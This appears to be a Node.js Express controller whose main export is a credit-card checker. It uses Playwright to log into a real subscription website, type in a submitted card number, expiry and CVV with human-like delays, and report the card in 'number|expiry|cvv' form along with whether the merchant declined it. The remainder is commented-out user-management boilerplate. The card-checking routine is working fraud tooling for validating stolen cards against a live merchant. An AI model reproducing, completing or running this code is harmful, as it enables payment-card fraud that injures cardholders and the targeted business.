const { chromium } = require("playwright");

const charges = (req, res) => {
  const { cardNumber, cardExpiry, cardCvv, name, email, password, } = req.body
  async function CheckCard() {
    try {
      const browser = await chromium.launch({ headless: false, });
      const context = await browser.newContext();
      const page = await context.newPage();
      page.on('console', async msg => {
        if (msg.type() === 'error') {  // Puedes filtrar por el tipo de mensaje (log, error, warning, etc.)
          // await page.close();
          // await browser.close();
          // await page.pause();
          // return res.json({ msg: `Card status: ${msg.text()}` });
        }
        if (msg.type() === 'log') {  // Puedes filtrar por el tipo de mensaje (log, error, warning, etc.)
          // await page.close();
          // await browser.close();
          // return console.log(`Card status: ${msg.text()}`);
        }
      });
      // page.on('request', async (request) => {
      //   console.log('req', request.url());
      // });
      await page.route(
        "**/*.{png,jpg,jpeg,svg}",
        (route) => route.abort()
      );
      await page.goto('https://www.dipseastories.com/account/');
      await page.locator("input[name='email']").fill(email);
      await page.locator("input[name='password']").fill(password);
      await page.keyboard.press('Tab');
      await page.keyboard.press('Tab');
      await page.keyboard.press('Enter');
      await page.locator("a[href='/subscribe/']").click();
      // inicia Check targeta
      await page.waitForSelector("input[id='cc-name ccname']")
      await page.locator("input[id='cc-name ccname']").fill(name);
      await page.waitForTimeout(6000);
      await page.keyboard.press('Tab');
      await page.waitForTimeout(1000);
      await page.keyboard.type(cardNumber, { delay: 500 });
      await page.waitForTimeout(1000);
      await page.keyboard.press('Tab');
      await page.keyboard.press('Tab');
      await page.keyboard.type(cardExpiry, { delay: 500 });
      await page.keyboard.press('Tab');
      await page.waitForTimeout(1000);
      await page.keyboard.type(cardCvv, { delay: 500 });
      await page.keyboard.press('Tab');
      await page.keyboard.press('Enter');
      await page.waitForTimeout(6000);
      const cardErrorCount = await page.locator('.formElements__ErrorBodyText-sc-a56iom-9.bXCsCt').count();
      console.log("count", cardErrorCount)
      if (cardErrorCount > 0) {
        const cardError = await page.locator('.formElements__ErrorBodyText-sc-a56iom-9.bXCsCt').innerText();
        // const c = await page.getByText('Your card was declined.').innerText();
        await page.close();
        await browser.close();
        return res.json({ card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`, status: cardError });
      }
      console.log('inicial')
      setTimeout(async () => {
        await page.close();
        await browser.close();
        return res.json({
          card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
          status: 'timeout'
        });
      }, 15000);
      console.log('final')
    } catch (error) {
      console.log(error);
      await page.close();
      await browser.close();
      return res.status(500).send({
        card: `${cardNumber}|${cardExpiry.replace(" / ", "|")}|${cardCvv}`,
        status: "Ocurrio un error"
      })
    }
  }
  return CheckCard();
};

// const obtenerUsuarios = (req, res) => {
//   usuarioRepositorio.obtenerUsuarios()
//     .then((result) => {
//       return res.json(result)
//     }).catch((err) => {
//       console.log(err)
//       return res.status(500).send({ msg: "Ocurrio un error" })
//     });
// }

// const obtenerUsuarioId = (req, res) => {
//   const { id } = req.params

//   usuarioRepositorio.obtenerUsuarioPorId(id)
//     .then((result) => {
//       if (result.length === 0) {
//         const error = new Error("Usuario No Encontrado")
//         return res.status(404).json({ msg: error.message });
//       }
//       return res.json(result[0])
//     }).catch((err) => {
//       console.log(err)
//       return res.status(500).send({ msg: "Ocurrio un error" })
//     });
// }

// const actualizarUsuarioId = (req, res) => {
//   const { id } = req.params;

//   usuarioRepositorio.actualizarUsuarioId(id, req.body)
//     .then((result) => {
//       if (result.affectedRows <= 0) {
//         const error = new Error("Usuario No Encontrado")
//         return res.status(404).json({ msg: error.message });
//       }
//       return usuarioRepositorio.obtenerUsuarioPorId(id)
//         .then((result) => {
//           return res.json(result[0])
//         }).catch((err) => {
//           console.log(err)
//           return res.status(500).send({ msg: "Ocurrio un error" })
//         });
//     }).catch((err) => {
//       console.log(err)
//       return res.status(500).send({ msg: "Ocurrio un error" })
//     });
// }

// const elimiarUsuarioId = (req, res) => {
//   const { id } = req.params;
//   usuarioRepositorio.elimiarUsuarioId(id)
//     .then((result) => {
//       if (result.affectedRows <= 0) {
//         const error = new Error("Usuario No Encontrado")
//         return res.status(404).json({ msg: error.message });
//       }
//       return res.json({ msg: "Usuario eliminado correctamente" })
//     }).catch((err) => {
//       console.log(err)
//       return res.status(500).send({ msg: "Ocurrio un error" })
//     });
// }

// const autenticar = (req, res) => {
//   const { Email, Password } = req.body

//   usuarioRepositorio.autenticar(Email, Password)
//     .then((result) => {
//       return res.json(result)
//     }).catch((err) => {
//       console.log(err)
//       return res.status(500).send({ msg: "Ocurrio un error" })
//     });
// }

// const confirmar = (req, res) => {
//   const { token } = req.params

//   usuarioRepositorio.buscarPorToken(token)
//     .then((result) => {
//       return res.json(result)
//     }).catch((err) => {
//       console.log(err)
//       return res.status(500).send({ msg: "Ocurrio un error" })
//     });
// }

// const olvidePassword = (req, res) => {
//   res.send("olvide pasword usuario...")
//   // const { email } = req.body

//   // try {
//   //   const usuario = await Usuario.findOne({ email })
//   //   if (!usuario) {
//   //     const error = new Error("el usuario no existe")
//   //     return res.status(404).json({ msg: error.message })
//   //   }
//   //   usuario.token = generarId()
//   //   await usuario.save()
//   //   emailOlvidePassword({
//   //     email: usuario.email,
//   //     nombre: usuario.nombre,
//   //     token: usuario.token
//   //   })
//   //   return res.json({ msg: "hemos enviado un email con las instrucciones" })
//   // } catch (error) {
//   //   console.log(error)
//   //   return res.status(500).send({ msg: "Ocurrio un error" })
//   // }
// }

module.exports = {
  charges,
}

